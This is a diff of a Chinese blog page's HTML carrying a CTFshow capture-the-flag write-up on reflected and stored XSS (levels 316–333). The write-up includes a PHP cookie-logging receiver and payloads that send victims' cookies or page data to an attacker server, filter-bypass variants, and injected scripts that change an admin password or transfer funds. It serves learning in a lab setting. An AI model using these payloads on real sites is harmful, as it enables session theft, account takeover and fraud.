@@ -27,26 +27,26 @@
 
   
   
-    <meta name="description" content="反射型xssWEB316(无过滤)在服务器上放一个接受cookie的文件xss.php 1234567&lt;?php	$cookie &#x3D; $_GET[&#x27;cookie&#x27;];	$time &#x3D; date(&#x27;Y-m-d h:i:s&#x27;, time());	$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);	fwr">
+    <meta name="description" content="反射型xss  WEB316(无过滤) 在服务器上放一个接受cookie的文件xss.php 1234567&lt;?php	$cookie &#x3D; $_GET[&#x27;cookie&#x27;];	$time &#x3D; date(&#x27;Y-m-d h:i:s&#x27;, time());	$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTFSHOW-XSS">
 <meta property="og:url" content="http://example.com/2025/02/19/CTFSHOW-XSS/index.html">
 <meta property="og:site_name" content="KL">
-<meta property="og:description" content="反射型xssWEB316(无过滤)在服务器上放一个接受cookie的文件xss.php 1234567&lt;?php	$cookie &#x3D; $_GET[&#x27;cookie&#x27;];	$time &#x3D; date(&#x27;Y-m-d h:i:s&#x27;, time());	$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);	fwr">
+<meta property="og:description" content="反射型xss  WEB316(无过滤) 在服务器上放一个接受cookie的文件xss.php 1234567&lt;?php	$cookie &#x3D; $_GET[&#x27;cookie&#x27;];	$time &#x3D; date(&#x27;Y-m-d h:i:s&#x27;, time());	$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/20250219133355444.png">
-<meta property="og:image" content="http://example.com/images/20250219211305885.png">
-<meta property="og:image" content="http://example.com/images/20250219214825137.png">
-<meta property="og:image" content="http://example.com/images/20250219215808389.png">
-<meta property="og:image" content="http://example.com/images/20250219214744023.png">
-<meta property="og:image" content="http://example.com/images/20250219223644616.png">
-<meta property="og:image" content="http://example.com/images/20250220171525904.png">
+<meta property="og:image" content="http://example.com/2025/02/19/images/20250219133355444.png">
+<meta property="og:image" content="http://example.com/2025/02/19/images/20250219211305885.png">
+<meta property="og:image" content="http://example.com/2025/02/19/images/20250219214825137.png">
+<meta property="og:image" content="http://example.com/2025/02/19/images/20250219215808389.png">
+<meta property="og:image" content="http://example.com/2025/02/19/images/20250219214744023.png">
+<meta property="og:image" content="http://example.com/2025/02/19/images/20250219223644616.png">
+<meta property="og:image" content="http://example.com/2025/02/19/images/20250220171525904.png">
 <meta property="article:published_time" content="2025-02-19T05:30:13.000Z">
 <meta property="article:modified_time" content="2025-02-23T08:02:13.997Z">
 <meta property="article:author" content="fuboy">
 <meta property="article:tag" content="XXS">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/20250219133355444.png">
+<meta name="twitter:image" content="http://example.com/2025/02/19/images/20250219133355444.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -203,7 +203,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">1.</span> <span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB316-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">WEB316(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB317-%E8%BF%87%E6%BB%A4script"><span class="toc-number">1.2.</span> <span class="toc-text">WEB317(过滤script)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB318-%E8%BF%87%E6%BB%A4script-img"><span class="toc-number">1.3.</span> <span class="toc-text">WEB318(过滤script\img)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB319"><span class="toc-number">1.4.</span> <span class="toc-text">WEB319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB320-%E8%BF%87%E6%BB%A4script-img-%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.5.</span> <span class="toc-text">WEB320(过滤script\img\空格)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB321"><span class="toc-number">1.6.</span> <span class="toc-text">WEB321</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB322-%E9%99%A4%E4%BA%86%E4%BB%A5%E4%B8%8A%E8%BF%98%E8%BF%87%E6%BB%A4xss"><span class="toc-number">1.7.</span> <span class="toc-text">WEB322(除了以上还过滤xss)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB323-326"><span class="toc-number">1.8.</span> <span class="toc-text">WEB323-326</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8Bxss"><span class="toc-number">2.</span> <span class="toc-text">储存型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB327-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">WEB327(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB328"><span class="toc-number">2.2.</span> <span class="toc-text">WEB328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB329"><span class="toc-number">2.3.</span> <span class="toc-text">WEB329</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB330"><span class="toc-number">2.4.</span> <span class="toc-text">WEB330</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB331"><span class="toc-number">2.5.</span> <span class="toc-text">WEB331</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB332"><span class="toc-number">2.6.</span> <span class="toc-text">WEB332</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB333"><span class="toc-number">2.7.</span> <span class="toc-text">WEB333</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">1.</span> <span class="toc-text"> 反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web316%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> WEB316(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web317%E8%BF%87%E6%BB%A4script"><span class="toc-number">1.2.</span> <span class="toc-text"> WEB317(过滤script)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web318%E8%BF%87%E6%BB%A4scriptimg"><span class="toc-number">1.3.</span> <span class="toc-text"> WEB318(过滤script\img)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web319"><span class="toc-number">1.4.</span> <span class="toc-text"> WEB319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web320%E8%BF%87%E6%BB%A4scriptimg%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.5.</span> <span class="toc-text"> WEB320(过滤script\img\空格)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web321"><span class="toc-number">1.6.</span> <span class="toc-text"> WEB321</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web322%E9%99%A4%E4%BA%86%E4%BB%A5%E4%B8%8A%E8%BF%98%E8%BF%87%E6%BB%A4xss"><span class="toc-number">1.7.</span> <span class="toc-text"> WEB322(除了以上还过滤xss)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web323-326"><span class="toc-number">1.8.</span> <span class="toc-text"> WEB323-326</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8Bxss"><span class="toc-number">2.</span> <span class="toc-text"> 储存型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web327%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text"> WEB327(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web328"><span class="toc-number">2.2.</span> <span class="toc-text"> WEB328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web329"><span class="toc-number">2.3.</span> <span class="toc-text"> WEB329</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web330"><span class="toc-number">2.4.</span> <span class="toc-text"> WEB330</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web331"><span class="toc-number">2.5.</span> <span class="toc-text"> WEB331</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web332"><span class="toc-number">2.6.</span> <span class="toc-text"> WEB332</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web333"><span class="toc-number">2.7.</span> <span class="toc-text"> WEB333</span></a></li></ol></li></ol>
       
   </div>
 </div>
@@ -216,7 +216,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">26</div>
+    <div class="sidebar-state-number">38</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -224,7 +224,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">16</div>
+    <div class="sidebar-state-number">18</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -306,93 +306,97 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><h3 id="WEB316-无过滤"><a href="#WEB316-无过滤" class="headerlink" title="WEB316(无过滤)"></a>WEB316(无过滤)</h3><p>在服务器上放一个接受cookie的文件xss.php</p>
+        <h2 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss"></a> 反射型xss</h2>
+<h3 id="web316无过滤"><a class="markdownIt-Anchor" href="#web316无过滤"></a> WEB316(无过滤)</h3>
+<p>在服务器上放一个接受cookie的文件xss.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>payload:</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.<span class="property">href</span>=<span class="string">&quot;http://(自己服务器的公网ip)/xss/xss.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/20250219133355444.png" alt="image-20250219133355444"></p>
-<h3 id="WEB317-过滤script"><a href="#WEB317-过滤script" class="headerlink" title="WEB317(过滤script)"></a>WEB317(过滤script)</h3><p>用上一关的方法行不通</p>
+<p><img src="../images/20250219133355444.png" alt="image-20250219133355444" /></p>
+<h3 id="web317过滤script"><a class="markdownIt-Anchor" href="#web317过滤script"></a> WEB317(过滤script)</h3>
+<p>用上一关的方法行不通</p>
 <p>猜测是过滤了script标签</p>
 <p>我试了一下img标签</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=document.location=&quot;http://ip//xss/xss.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
-
 <p>但是发现获取不到管理员的cookie（不知道为什么）</p>
 <p>然后又试了几个标签，成功获取到cookie</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.open(&#x27;http://ip/xss/xss.php?cookie=&#x27;+document.cookie)&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;location.href=&#x27;http://ip/xss/xss.php?cookie=&#x27;+document.cookie&quot;/&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="WEB318-过滤script-img"><a href="#WEB318-过滤script-img" class="headerlink" title="WEB318(过滤script\img)"></a>WEB318(过滤script\img)</h3><p>在做之前可以先用简单的js弹窗检验一下过滤了什么</p>
+<h3 id="web318过滤scriptimg"><a class="markdownIt-Anchor" href="#web318过滤scriptimg"></a> WEB318(过滤script\img)</h3>
+<p>在做之前可以先用简单的js弹窗检验一下过滤了什么</p>
 <p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>无回显</p>
 <p><code>&lt;img alert(1)&gt;</code>无回显</p>
 <p>其他标签可以</p>
 <p>还是用上关的标签即可通过</p>
-<h3 id="WEB319"><a href="#WEB319" class="headerlink" title="WEB319"></a>WEB319</h3><p>同318</p>
+<h3 id="web319"><a class="markdownIt-Anchor" href="#web319"></a> WEB319</h3>
+<p>同318</p>
 <p>补充：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe οnlοad=document.location=&#x27;http://ip/xss/xss.php?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="WEB320-过滤script-img-空格"><a href="#WEB320-过滤script-img-空格" class="headerlink" title="WEB320(过滤script\img\空格)"></a>WEB320(过滤script\img\空格)</h3><p>空格可以用<code>%09</code>、<code>tab</code>、<code>/</code>、<code>/**/</code>代替。</p>
+<h3 id="web320过滤scriptimg空格"><a class="markdownIt-Anchor" href="#web320过滤scriptimg空格"></a> WEB320(过滤script\img\空格)</h3>
+<p>空格可以用<code>%09</code>、<code>tab</code>、<code>/</code>、<code>/**/</code>代替。</p>
 <p>其他一致</p>
 <p>扩展一下payload：</p>
 <p><code>String.fromCharCode()</code>函数：ascii码转字符</p>
-<h3 id="WEB321"><a href="#WEB321" class="headerlink" title="WEB321"></a>WEB321</h3><p>同上</p>
-<h3 id="WEB322-除了以上还过滤xss"><a href="#WEB322-除了以上还过滤xss" class="headerlink" title="WEB322(除了以上还过滤xss)"></a>WEB322(除了以上还过滤xss)</h3><p>所以需要修改我们服务器上的文件目录，避免出现xss</p>
+<h3 id="web321"><a class="markdownIt-Anchor" href="#web321"></a> WEB321</h3>
+<p>同上</p>
+<h3 id="web322除了以上还过滤xss"><a class="markdownIt-Anchor" href="#web322除了以上还过滤xss"></a> WEB322(除了以上还过滤xss)</h3>
+<p>所以需要修改我们服务器上的文件目录，避免出现xss</p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/**/οnlοad=location.href=&quot;http://ip/1111/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/**/οnlοad=location.href=&quot;http://ip/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;body/οnlοad=location.href=&quot;http://ip/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;input/**/οnfοcus=location.href=&quot;http://ip/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="WEB323-326"><a href="#WEB323-326" class="headerlink" title="WEB323-326"></a>WEB323-326</h3><p>用322的payload都能过</p>
-<h2 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a>储存型xss</h2><h3 id="WEB327-无过滤"><a href="#WEB327-无过滤" class="headerlink" title="WEB327(无过滤)"></a>WEB327(无过滤)</h3><p>因为要接受管理员的cookie，所以收件人必须是admin</p>
-<p><img src="/../images/20250219211305885.png" alt="image-20250219211305885"></p>
-<h3 id="WEB328"><a href="#WEB328" class="headerlink" title="WEB328"></a>WEB328</h3><p>进入题目。我们发现有登录、注册、用户管理界面</p>
+<h3 id="web323-326"><a class="markdownIt-Anchor" href="#web323-326"></a> WEB323-326</h3>
+<p>用322的payload都能过</p>
+<h2 id="储存型xss"><a class="markdownIt-Anchor" href="#储存型xss"></a> 储存型xss</h2>
+<h3 id="web327无过滤"><a class="markdownIt-Anchor" href="#web327无过滤"></a> WEB327(无过滤)</h3>
+<p>因为要接受管理员的cookie，所以收件人必须是admin</p>
+<p><img src="../images/20250219211305885.png" alt="image-20250219211305885" /></p>
+<h3 id="web328"><a class="markdownIt-Anchor" href="#web328"></a> WEB328</h3>
+<p>进入题目。我们发现有登录、注册、用户管理界面</p>
 <p>无从下手</p>
 <p>看了几个大佬的题解发现</p>
 <p>**关键点：**这个只有一个用户管理界面是我们看不到的，所以需要尝试获取管理员的cookie，冒充管理员登录</p>
-<p><img src="/../images/20250219214825137.png" alt="image-20250219214825137"></p>
+<p><img src="../images/20250219214825137.png" alt="image-20250219214825137" /></p>
 <p>**获取cookie：**我们注册时，在密码或者用户名处注入一个在远程服务器获取cookie的payload，当普通用户登录时，我们是看不到密码或用户名的，但当管理员登录时，用户管理界面的源代码会执行我们注入进去的payload，从而将管理员的cookie盗取</p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://ip/xss/xss.php?cookie=&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
 <p>然后我们在服务器接受到了管理员的cookie，管理员的cookie会在一定时间内变化，所以我们需要在cookie变化之前登录进去</p>
 <p>我们在用户管理界面将cookie修改为我们获取到的管理员的cookie，刷新</p>
 <p>成功登录，然后发现了flag</p>
-<p><img src="/../images/20250219215808389.png" alt="image-20250219215808389"></p>
-<p><img src="/../images/20250219214744023.png" alt="image-20250219214744023"></p>
-<h3 id="WEB329"><a href="#WEB329" class="headerlink" title="WEB329"></a>WEB329</h3><p>这一关和上一关很像，但是有一个区别就是能得到cookie但是还是访问不了页面 原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p>
+<p><img src="../images/20250219215808389.png" alt="image-20250219215808389" /></p>
+<p><img src="../images/20250219214744023.png" alt="image-20250219214744023" /></p>
+<h3 id="web329"><a class="markdownIt-Anchor" href="#web329"></a> WEB329</h3>
+<p>这一关和上一关很像，但是有一个区别就是能得到cookie但是还是访问不了页面 原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p>
 <p>既然cookie无法盗取，那我们可以考虑盗取管理员页面的一些信息，比如admin密码</p>
 <p>看了题解，需要<strong>通过类名查找元素，通过document来获取</strong></p>
 <p>admin的密码的地方类为<code>layui-table-cell laytable-cell-1-0-1</code></p>
-<p><img src="/../images/20250219223644616.png" alt="image-20250219223644616"></p>
+<p><img src="../images/20250219223644616.png" alt="image-20250219223644616" /></p>
 <p>与上一关一样的注入方式</p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://ip/&#x27;+document.getElementsByClassName(&#x27;laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">window.open(&#x27;http://ip/&#x27; + document.getElementsByClassName(&#x27;laytable-cell-1-0-1&#x27;)[1].innerHTML) 这是一个调用 window.open() 函数的语句，用于打开新的浏览器窗口。</span><br><span class="line"></span><br><span class="line">&#x27;http://ip/&#x27; 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http://）、主机名（ip）和端口号（80），以及路径（后面的斜杠 /）。</span><br><span class="line"></span><br><span class="line">document.getElementsByClassName(&#x27;laytable-cell-1-0-1&#x27;)[1].innerHTML 这是一系列 DOM 操作，用于获取网页中特定元素的内容。</span><br><span class="line"></span><br><span class="line">document.getElementsByClassName(&#x27;laytable-cell-1-0-1&#x27;) 是一个通过类名查找元素的方法。它查找具有类名&#x27;laytable-cell-1-0-1&#x27; 的元素，通常这是一种针对表格单元格的选择。</span><br><span class="line"></span><br><span class="line">[1] 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。</span><br><span class="line"></span><br><span class="line">.innerHTML 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。</span><br><span class="line">1、innerHTML:</span><br><span class="line">　　从对象的起始位置到终止位置的全部内容,不包括Html标签。</span><br><span class="line">innerText可替代innerHTML</span><br><span class="line">2、outerHTML:</span><br><span class="line">　　除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure>
-
 <p>注入后，我们在服务器中就接受到了来自目标页面的目标内容-flag</p>
 <p>其他方法可以看</p>
 <p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133375048">Ctfshow web入门 XSS篇 web316-web333 详细题解 全_ctfshow web316-CSDN博客</a>]:</p>
-<h3 id="WEB330"><a href="#WEB330" class="headerlink" title="WEB330"></a>WEB330</h3><p>这题较之前多了一个修改密码</p>
+<h3 id="web330"><a class="markdownIt-Anchor" href="#web330"></a> WEB330</h3>
+<p>这题较之前多了一个修改密码</p>
 <p>先用之前的方法试了一下，发现服务器接受不到cookie</p>
 <p>看了一下群主的视频，发现这题可以修改管理员的密码</p>
 <p><strong>原理</strong>：当我们点击修改密码时，抓包，它有修改密码的路径<code>/api/change.php?p=</code>，那我们可以通过构造一个js payload，使管理员登录的时候跳转到修改密码的页面并且将管理员密码修改为我们定的密码</p>
 <p><strong>步骤</strong>：点击注册，用户名为我们设置的payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&quot;http://127.0.0.1/api/change.php?p=123&quot;&lt;/script&gt;</span><br><span class="line">为什么是跳转到本地呢？</span><br><span class="line">傻啊！change.php本来就在管理员的本地</span><br></pre></td></tr></table></figure>
-
 <p>密码随便</p>
 <p>过个几秒</p>
 <p>用户名输入admin</p>
 <p>密码为我们设置的密码123</p>
 <p>登录成功，但马上就显示127.0.0.1拒绝连接，使得我们没时间来复制flag</p>
 <p>我们可以抓包或者直接查看源码</p>
-<h3 id="WEB331"><a href="#WEB331" class="headerlink" title="WEB331"></a>WEB331</h3><p>这里从GET方式修改密码改为POST方式</p>
+<h3 id="web331"><a class="markdownIt-Anchor" href="#web331"></a> WEB331</h3>
+<p>这里从GET方式修改密码改为POST方式</p>
 <p>看了群主的视频，学到了个新东西</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
 <p>这是 jQuery 提供的 Ajax 方法，用于向服务器发送异步 HTTP 请求</p>
 <p>除了payload不一样，其他与上一关都是一样的</p>
-<h3 id="WEB332"><a href="#WEB332" class="headerlink" title="WEB332"></a>WEB332</h3><p><img src="/../images/20250220171525904.png" alt="image-20250220171525904"></p>
+<h3 id="web332"><a class="markdownIt-Anchor" href="#web332"></a> WEB332</h3>
+<p><img src="../images/20250220171525904.png" alt="image-20250220171525904" /></p>
 <p>进题目一看，好家伙，这么多东西，主要多了转账和购买flag，那这题的思路基本就是构造payload给自己转账</p>
 <p><strong>法一：</strong></p>
 <p>好多题解都用的非预期</p>
@@ -405,26 +409,23 @@
 <p>先注册一个用户名test</p>
 <p>然后在服务器上放一个js文件，也是用上一题的ajax发送post请求（管理员发）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#a.js</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">  url: &quot;http://127.0.0.1/api/amount.php&quot;,</span><br><span class="line">  method: &quot;POST&quot;,</span><br><span class="line">  data:&#123;</span><br><span class="line">    &#x27;u&#x27;:&#x27;test&#x27;,</span><br><span class="line">    &#x27;a&#x27;:10000</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
 <p>然后就是想办法让管理员能访问到这个文件</p>
 <p>注册处写一个payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; src=&quot;http://ip/xss/a.js&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
 <p>然后只要后台admin点击这个链接后就会执行a.js</p>
 <p>然后登录test账户，发现钱已经到账了</p>
 <p><strong>法三：</strong></p>
 <p>其实和法二一样</p>
 <p>只不过直接在网站中注入，无需访问服务器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;admin2&#x27;,a:&#x27;9999&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="WEB333"><a href="#WEB333" class="headerlink" title="WEB333"></a>WEB333</h3><p><strong>法一：</strong></p>
+<h3 id="web333"><a class="markdownIt-Anchor" href="#web333"></a> WEB333</h3>
+<p><strong>法一：</strong></p>
 <p>这个是群主教的骚操作</p>
 <p>自己给自己转账，开始先转5块，后面转账金额呈指数增长</p>
 <p>可能是收款方加了钱，但付款方没减钱</p>
 <p><strong>法二：</strong></p>
 <p>和web332一样的操作</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;x&#x27;,a:&#x27;9999&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
@@ -508,10 +509,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        52.5k
+        62.9k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        03:31
+        04:11
       </div>
     
     
@@ -543,7 +544,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">1.</span> <span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB316-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">WEB316(无过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB317-%E8%BF%87%E6%BB%A4script"><span class="toc-number">1.2.</span> <span class="toc-text">WEB317(过滤script)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB318-%E8%BF%87%E6%BB%A4script-img"><span class="toc-number">1.3.</span> <span class="toc-text">WEB318(过滤script\img)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB319"><span class="toc-number">1.4.</span> <span class="toc-text">WEB319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB320-%E8%BF%87%E6%BB%A4script-img-%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.5.</span> <span class="toc-text">WEB320(过滤script\img\空格)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB321"><span class="toc-number">1.6.</span> <span class="toc-text">WEB321</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB322-%E9%99%A4%E4%BA%86%E4%BB%A5%E4%B8%8A%E8%BF%98%E8%BF%87%E6%BB%A4xss"><span class="toc-number">1.7.</span> <span class="toc-text">WEB322(除了以上还过滤xss)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 